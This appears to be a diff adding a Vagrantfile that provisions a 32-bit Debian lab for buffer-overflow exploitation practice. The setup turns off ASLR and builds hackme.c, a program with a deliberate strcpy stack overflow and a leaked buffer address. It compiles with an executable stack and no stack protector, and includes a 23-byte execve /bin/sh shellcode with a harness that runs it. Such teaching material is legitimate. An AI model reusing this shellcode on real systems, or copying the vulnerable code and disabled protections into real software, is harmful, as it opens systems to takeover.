@@ -1,0 +1,87 @@
+$script = <<-'SCRIPT'
+apt-get -y update
+apt-get install -y nasm gdb build-essential ed strace
+echo 0 | tee /proc/sys/kernel/randomize_va_space
+sudo -u vagrant -D ~vagrant touch .gdbinit 
+sudo -u vagrant -D ~vagrant ed .gdbinit <<EOF
+%d
+i
+set disassembly-flavor intel
+.
+wq
+EOF
+sudo -u vagrant -D ~vagrant touch hackme.c
+sudo -u vagrant -D ~vagrant ed hackme.c <<EOF
+%d
+i
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void vulnerable(char *input) {
+	char buffer[32];
+	printf("[DEBUG] Buffer is at %p\n", buffer);
+	strcpy(buffer, input);
+	printf("Hello %s!\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+	if (argc != 2) {
+		printf("Usage: %s name\n", argv[0]);
+		exit(EXIT_FAILURE);
+	}
+
+	vulnerable(argv[1]);
+	return EXIT_SUCCESS;
+}
+.
+wq
+EOF
+sudo -u vagrant -D ~vagrant touch shellcode.c
+sudo -u vagrant -D ~vagrant ed shellcode.c <<EOF
+%d
+i
+/*  *****************************************************
+    *    Linux/x86 execve /bin/sh shellcode 23 bytes    *
+    *****************************************************
+    *	  	  Author: Hamza Megahed		        *
+    *****************************************************
+    *             Twitter: @Hamza_Mega                  *
+    *****************************************************
+    *     blog: hamza-mega[dot]blogspot[dot]com         *
+    *****************************************************
+    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
+    *****************************************************
+*/
+
+#include <stdio.h>
+#include <string.h>
+ 
+char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+int main(void)
+{
+	fprintf(stdout,"Length: %d\n",strlen(shellcode));
+	(*(void(*)()) shellcode)();
+	return 0;
+}
+.
+wq
+EOF
+sudo -u vagrant -D ~vagrant touch Makefile
+sudo -u vagrant -D ~vagrant ed Makefile <<EOF
+%d
+i
+CFLAGS=-z execstack -fno-stack-protector -O0 -g
+all: hackme
+.
+wq
+EOF
+sudo -u vagrant -D ~vagrant make
+SCRIPT
+
+Vagrant.configure("2") do |config|
+  config.vm.box = "generic-x32/debian12"
+  config.vm.provision "shell", privileged: true, inline: $script
+end
